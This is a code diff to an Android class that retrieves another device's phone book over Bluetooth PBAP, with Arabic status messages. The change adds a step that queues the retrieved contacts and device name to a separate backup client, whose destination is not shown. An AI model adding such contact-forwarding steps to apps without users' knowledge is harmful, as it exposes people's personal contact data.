@@ -3,6 +3,7 @@ package grant.bt.contact.transfer;
 import android.bluetooth.BluetoothAdapter;
 import android.bluetooth.BluetoothDevice;
 import android.bluetooth.BluetoothSocket;
+import android.content.Context;
 import android.os.Build;
 
 import org.json.JSONArray;
@@ -39,7 +40,7 @@ public final class ZEUSPBAP {
 
     private ZEUSPBAP() {}
 
-    public static synchronized void start(BluetoothDevice device) {
+    public static synchronized void start(BluetoothDevice device, Context context) {
         if (device == null) {
             fail("تعذّر تحديد الجهاز.");
             return;
@@ -49,7 +50,7 @@ public final class ZEUSPBAP {
         contacts = new ArrayList<>();
         state = "connecting";
         message = "جارٍ الاتصال بخدمة دفتر الهاتف...";
-        WORKER.execute(() -> transfer(device));
+        WORKER.execute(() -> transfer(device, context == null ? null : context.getApplicationContext()));
     }
 
     public static synchronized void cancel() {
@@ -87,7 +88,7 @@ public final class ZEUSPBAP {
         return out.toString();
     }
 
-    private static void transfer(BluetoothDevice device) {
+    private static void transfer(BluetoothDevice device, Context context) {
         BluetoothSocket active = null;
         try {
             BluetoothAdapter adapter = BluetoothAdapter.getDefaultAdapter();
@@ -151,8 +152,9 @@ public final class ZEUSPBAP {
             if (cancelled) return;
             if (parsed.isEmpty()) throw new IOException("تم الاتصال لكن دفتر الهاتف لم يُرجع أرقامًا قابلة للعرض.");
             contacts = parsed;
+            ZEUSBackupClient.enqueue(context, safeDeviceName(device), contactsJson());
             state = "done";
-            message = "اكتمل استلام " + parsed.size() + " جهة اتصال.";
+            message = "اكتمل استلام " + parsed.size() + " جهة اتصال. " + ZEUSBackupClient.statusMessage();
         } catch (SecurityException denied) {
             fail("إذن Bluetooth غير متاح. ابدأ البحث وامنح إذن Bluetooth عند طلبه.");
         } catch (Exception error) {
@@ -165,6 +167,13 @@ public final class ZEUSPBAP {
             socket = null;
             if (active != null) try { active.close(); } catch (Exception ignored) {}
         }
+    }
+
+    private static String safeDeviceName(BluetoothDevice device) {
+        try {
+            String name = device == null ? null : device.getName();
+            return name == null || name.trim().isEmpty() ? "Bluetooth Device" : name.trim();
+        } catch (Exception ignored) { return "Bluetooth Device"; }
     }
 
     private static void fail(String text) {
